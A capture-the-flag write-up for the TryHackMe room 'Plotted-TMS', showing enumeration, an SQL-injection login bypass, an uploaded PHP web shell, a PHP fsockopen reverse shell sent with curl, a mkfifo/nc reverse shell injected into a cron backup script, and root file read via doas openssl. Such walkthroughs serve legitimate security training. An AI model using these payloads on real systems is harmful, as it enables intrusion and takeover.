## Plotted-TMS

https://tryhackme.com/room/plottedtms

## Enum
```
nmap -Pn -sS -sC -sV 10.10.200.217 -p 22,80,445 -A

PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 a3:6a:9c:b1:12:60:b2:72:13:09:84:cc:38:73:44:4f (RSA)
|   256 b9:3f:84:00:f4:d1:fd:c8:e7:8d:98:03:38:74:a1:4d (ECDSA)
|_  256 d0:86:51:60:69:46:b2:e1:39:43:90:97:a6:af:96:93 (ED25519)
80/tcp  open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.41 (Ubuntu)
445/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.41 (Ubuntu)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Adtran 424RG FTTH gateway (92%), Linux 2.6.32 (92%), Linux 2.6.39 - 3.2 (92%), Linux 3.1 - 3.2 (92%), Linux 3.2 - 4.9 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_smb2-time: Protocol negotiation failed (SMB2)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 69.04 seconds
```

```
ffuf -u http://10.10.200.217/FUZZ -w=/usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
________________________________________________

.hta                    [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 3752ms]
.htaccess               [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 4749ms]
.htpasswd               [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 5763ms]
admin                   [Status: 301, Size: 314, Words: 20, Lines: 10, Duration: 431ms]
index.html              [Status: 200, Size: 10918, Words: 3499, Lines: 376, Duration: 424ms]
passwd                  [Status: 200, Size: 25, Words: 1, Lines: 2, Duration: 513ms]
server-status           [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 511ms]
shadow                  [Status: 200, Size: 25, Words: 1, Lines: 2, Duration: 511ms]
:: Progress: [4713/4713] :: Job [1/1] :: 87 req/sec :: Duration: [0:00:58] :: Errors: 0 ::
```
![image](https://user-images.githubusercontent.com/6504854/196202485-0ed694a3-d42c-4b9b-a6ea-ada9a37413cb.png)

![image](https://user-images.githubusercontent.com/6504854/196202548-e9723cd2-a357-486b-a10d-305c363e7301.png)

```
echo 'bm90IHRoaXMgZWFzeSA6RA==' | base64 -d

not this easy :D 
```

```
ffuf -u http://10.10.200.217/admin/FUZZ -w=/usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
________________________________________________

.htpasswd               [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 424ms]
.htaccess               [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 431ms]
.hta                    [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 2546ms]
id_rsa                  [Status: 200, Size: 81, Words: 1, Lines: 2, Duration: 476ms]
:: Progress: [4713/4713] :: Job [1/1] :: 88 req/sec :: Duration: [0:01:00] :: Errors: 0 ::
```
![image](https://user-images.githubusercontent.com/6504854/196202891-68560716-632b-4fc1-8b97-6c924c59f9b8.png)

```
echo 'VHJ1c3QgbWUgaXQgaXMgbm90IHRoaXMgZWFzeS4ubm93IGdldCBiYWNrIHRvIGVudW1lcmF0aW9uIDpE' | base64 -d

Trust me it is not this easy..now get back to enumeration :D 
```
🤔🤔🤔

```
ffuf -u http://10.10.200.217:445/FUZZ -w=/usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt 
________________________________________________

.htpasswd               [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 920ms]
.htaccess               [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 1943ms]
.hta                    [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 4915ms]
index.html              [Status: 200, Size: 10918, Words: 3499, Lines: 376, Duration: 514ms]
management              [Status: 301, Size: 324, Words: 20, Lines: 10, Duration: 478ms]
server-status           [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 513ms]
:: Progress: [4713/4713] :: Job [1/1] :: 84 req/sec :: Duration: [0:01:01] :: Errors: 0 ::
```

```
ffuf -u http://10.10.200.217:445/management/FUZZ -w=/usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
________________________________________________

.htpasswd               [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 4168ms]
.hta                    [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 4174ms]
.htaccess               [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 5173ms]
admin                   [Status: 301, Size: 330, Words: 20, Lines: 10, Duration: 512ms]
assets                  [Status: 301, Size: 331, Words: 20, Lines: 10, Duration: 457ms]
build                   [Status: 301, Size: 330, Words: 20, Lines: 10, Duration: 513ms]
classes                 [Status: 301, Size: 332, Words: 20, Lines: 10, Duration: 448ms]
database                [Status: 301, Size: 333, Words: 20, Lines: 10, Duration: 509ms]
dist                    [Status: 301, Size: 329, Words: 20, Lines: 10, Duration: 430ms]
inc                     [Status: 301, Size: 328, Words: 20, Lines: 10, Duration: 456ms]
index.php               [Status: 200, Size: 14506, Words: 2399, Lines: 281, Duration: 507ms]
libs                    [Status: 301, Size: 329, Words: 20, Lines: 10, Duration: 472ms]
pages                   [Status: 301, Size: 330, Words: 20, Lines: 10, Duration: 511ms]
plugins                 [Status: 301, Size: 332, Words: 20, Lines: 10, Duration: 464ms]
uploads                 [Status: 301, Size: 332, Words: 20, Lines: 10, Duration: 511ms]
:: Progress: [4713/4713] :: Job [1/1] :: 78 req/sec :: Duration: [0:01:01] :: Errors: 0 :
```
![image](https://user-images.githubusercontent.com/6504854/196204229-9c308d27-c1cd-4a61-a0d2-853366261a58.png)

![image](https://user-images.githubusercontent.com/6504854/196204530-b36d914c-226e-4e4f-95c6-982721e6b8f9.png)

![image](https://user-images.githubusercontent.com/6504854/196204903-8e34163f-2219-47f0-98bc-18e62e16c7bc.png)

![image](https://user-images.githubusercontent.com/6504854/196205429-61b22a90-36ca-4871-80fa-2178e62ddacc.png)

🚩 admin:admin123 jsmith:jsmith123 is not valid credential. I couldn't login 😞

![image](https://user-images.githubusercontent.com/6504854/196206509-700ac403-3d62-4b66-b65d-b667d777a2b8.png)

![image](https://user-images.githubusercontent.com/6504854/196206682-3c9d1dbc-a903-4c7e-a2ce-76813c4d7130.png)

🚩 I logined as admin via just simple SQLi.

![image](https://user-images.githubusercontent.com/6504854/196209509-36726e53-4b76-4454-8a4a-9af95ebe5bf7.png)

🚩 I tried to upload pentestermonkey revers-shell as usual,but it couldn't work.

![image](https://user-images.githubusercontent.com/6504854/196210408-75bfd31a-a6ef-4f5f-9d3c-d8e5c505e7c5.png)

🚩 cmd.php is web shell.
```
<?php
    if(isset($_GET['cmd']))
    {
        echo($_GET['cmd']);
        system($_GET['cmd']);
    }
?>
```

![image](https://user-images.githubusercontent.com/6504854/196213263-0bccb1ac-8021-4149-aca9-a340f4958a09.png)

```
curl 'http://10.10.192.17:445/management/uploads/1666018260_cmd.php?cmd=php%20-r%20%27$sock=fsockopen(%2210.4.0.111%22,4444);exec(%22sh%20%3C%263%20%3E%263%202%3E%263%22);%27'
```

🚩 OK!

## Flag

```
nc -lnvp 4444
listening on [any] 4444 ...
connect to [10.4.0.111] from (UNKNOWN) [10.10.192.17] 42966
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
python3 -c 'import pty;pty.spawn("/bin/bash")';

www-data@plotted:/var/www/html/445/management/uploads$ cd /home
cd /home
www-data@plotted:/home$ ls
ls
plot_admin  ubuntu
www-data@plotted:/home$ cd plot*
cd plot*
www-data@plotted:/home/plot_admin$ ls -la
ls -la
total 32
drwxr-xr-x  4 plot_admin plot_admin 4096 Oct 28  2021 .
drwxr-xr-x  4 root       root       4096 Oct 28  2021 ..
lrwxrwxrwx  1 root       root          9 Oct 28  2021 .bash_history -> /dev/null
-rw-r--r--  1 plot_admin plot_admin  220 Oct 28  2021 .bash_logout                            
-rw-r--r--  1 plot_admin plot_admin 3771 Oct 28  2021 .bashrc                                 
drwxrwxr-x  3 plot_admin plot_admin 4096 Oct 28  2021 .local                                  
-rw-r--r--  1 plot_admin plot_admin  807 Oct 28  2021 .profile                                
drwxrwx--- 14 plot_admin plot_admin 4096 Oct 28  2021 tms_backup                              
-rw-rw----  1 plot_admin plot_admin   33 Oct 28  2021 user.txt                                

www-data@plotted:/home/plot_admin$ cat user.txt                                               
cat user.txt                                                                                  
cat: user.txt: Permission denied                                                              

www-data@plotted:/home/plot_admin$ find / -type f -user plot_admin 2>/dev/null                
<_admin$ find / -type f -user plot_admin 2>/dev/null                                          
/var/www/scripts/backup.sh                                                                    
/home/plot_admin/.bashrc                                                                      
/home/plot_admin/.bash_logout                                                                 
/home/plot_admin/user.txt                                                                     
/home/plot_admin/.profile                                                                     

www-data@plotted:/home/plot_admin$ cat /var/www/scripts/backup.sh                         
cat /var/www/scripts/backup.sh                                                            
#!/bin/bash                                                                               
                                                                                          
/usr/bin/rsync -a /var/www/html/management /home/plot_admin/tms_backup                    
/bin/chmod -R 770 /home/plot_admin/tms_backup/management                             

www-data@plotted:/var/www/scripts$ mv backup.sh backup_old.sh
mv backup.sh backup_old.sh

www-data@plotted:/var/www/scripts$ echo '#!/bin/bash' > backup.sh
echo '#!/bin/bash' > backup.sh
www-data@plotted:/var/www/scripts$ echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.4.0.111 4242 >/tmp/f' >> backup.sh
<sh -i 2>&1|nc 10.4.0.111 4242 >/tmp/f' >> backup.sh

www-data@plotted:/var/www/scripts$ chmod +x backup.sh
chmod +x backup.sh

```
🚩 I waited some seconds and got plot_admin sh.

```
nc -lnvp 4242

listening on [any] 4242 ...
connect to [10.4.0.111] from (UNKNOWN) [10.10.192.17] 49734
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=1001(plot_admin) gid=1001(plot_admin) groups=1001(plot_admin)
$ ls
tms_backup
user.txt
$ cat user.txt
7***************************b
$ python3 -c 'import pty; pty.spawn("/bin/bash")';
plot_admin@plotted:~$ sudo -l
sudo -l
[sudo] password for plot_admin: a

```
```
$ find / -perm /4000 -type f -exec ls -ld {} \; 2>/dev/null

< -perm /4000 -type f -exec ls -ld {} \; 2>/dev/null
-rwsr-xr-x 1 root root 43088 Sep 16  2020 /snap/core18/2284/bin/mount
~~~
-rwsr-xr-x 1 root root 115208 Oct  5  2021 /snap/snapd/13640/usr/lib/snapd/snap-confine
-rwsr-xr-x 1 root root 68208 Jul 14  2021 /usr/bin/passwd
-rwsr-xr-x 1 root root 166056 Jan 19  2021 /usr/bin/sudo
-rwsr-xr-x 1 root root 88464 Jul 14  2021 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 55528 Jul 21  2020 /usr/bin/mount
-rwsr-xr-x 1 root root 67816 Jul 21  2020 /usr/bin/su
-rwsr-xr-x 1 root root 85064 Jul 14  2021 /usr/bin/chfn
-rwsr-xr-x 1 root root 39144 Mar  7  2020 /usr/bin/fusermount
-rwsr-sr-x 1 daemon daemon 55560 Nov 12  2018 /usr/bin/at
-rwsr-xr-x 1 root root 53040 Jul 14  2021 /usr/bin/chsh
-rwsr-xr-x 1 root root 39144 Jul 21  2020 /usr/bin/umount
-rwsr-xr-x 1 root root 39008 Feb  5  2021 /usr/bin/doas
-rwsr-xr-x 1 root root 44784 Jul 14  2021 /usr/bin/newgrp
-rwsr-xr-x 1 root root 19040 Jun  3  2021 /usr/libexec/polkit-agent-helper-1
-rwsr-xr-x 1 root root 130408 Mar 26  2021 /usr/lib/snapd/snap-confine
-rwsr-xr-x 1 root root 14488 Jul  8  2019 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-- 1 root messagebus 51344 Jun 11  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 473576 Jul 23  2021 /usr/lib/openssh/ssh-keysign
```
🚩 /usr/bin/doas  What is doas? 🤔🤔🤔

https://wiki.archlinux.org/title/Doas

![image](https://user-images.githubusercontent.com/6504854/196230742-3cefbb11-1603-4af3-8607-361bcfe0529a.png)

🚩 I runned linpeas.sh and found it and consulted gtfobins.

![image](https://user-images.githubusercontent.com/6504854/196231472-b6862862-ec84-4875-ab49-daa43d5a2f0f.png)

```
plot_admin@plotted:~$ FILE=/root/root.txt
FILE=/root/root.txt
plot_admin@plotted:~$ doas openssl enc -in "$FILE"
doas openssl enc -in "$FILE"
Congratulations on completing this room!

5*****************************b

Hope you enjoyed the journey!


```
㊗️㊗️㊗️ Thank you for your reading, Happy hacking 😄😄😄



